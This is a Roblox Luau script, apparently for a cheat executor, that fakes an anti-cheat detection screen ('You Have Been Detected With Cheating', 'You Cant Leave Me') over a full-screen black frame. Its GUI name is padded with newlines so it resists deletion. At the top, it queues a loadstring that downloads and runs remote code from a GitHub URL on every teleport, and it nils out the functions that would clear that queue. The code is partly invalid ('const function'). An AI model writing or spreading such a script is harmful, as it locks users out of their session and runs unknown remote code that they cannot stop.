task.wait(0.15)
local G2L = {};
const function yeaa()
queueonteleport=queueonteleport or queue_on_teleport
queueonteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/whoisthisxor/assets/refs/heads/main/battleye.lua"))()')
getgenv().clearteleportqueue = nil 
getgenv().clear_teleport_queue = nil
getgenv().clearqueueonteleport = nil
end
task.spawn(yeaa)
local pgui=game:GetService("CoreGui")
-- StarterGui.
G2L["1"] = Instance.new("ScreenGui",pgui)
G2L["1"]["Name"] = '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nStopTryingToDeleteMe'
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui..main
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["ZIndex"] = 2;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Size"] = UDim2.new(0, 613, 0, 530);
G2L["2"]["Position"] = UDim2.new(0.28704, 0, 0.13839, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = "main"


-- StarterGui..main.ImageLabel
G2L["3"] = Instance.new("ImageLabel", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["Image"] = "rbxassetid://18518299306"
G2L["3"]["Size"] = UDim2.new(0, 621, 0, 530);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui..main.TextLabel
G2L["4"] = Instance.new("TextLabel", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["TextSize"] = 23;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["FontFace"] = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 0.98;
G2L["4"]["Size"] = UDim2.new(0, 253, 0, 64);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Text"] = "You Have Been Detected With Cheating"
G2L["4"]["Position"] = UDim2.new(0.30016, 0, -0.01132, 0);


-- StarterGui..main.2
G2L["5"] = Instance.new("TextLabel", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 32;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = "You Cant Leave Me"
G2L["5"]["Name"] = "2"
G2L["5"]["Position"] = UDim2.new(0.34258, 0, 0.05849, 0);


-- StarterGui..black
G2L["6"] = Instance.new("Frame", G2L["1"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Size"] = UDim2.new(0, 3038, 0, 1895);
G2L["6"]["Position"] = UDim2.new(-0.71065, 0, -0.71131, 0);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = "black"

return G2L["1"], require;
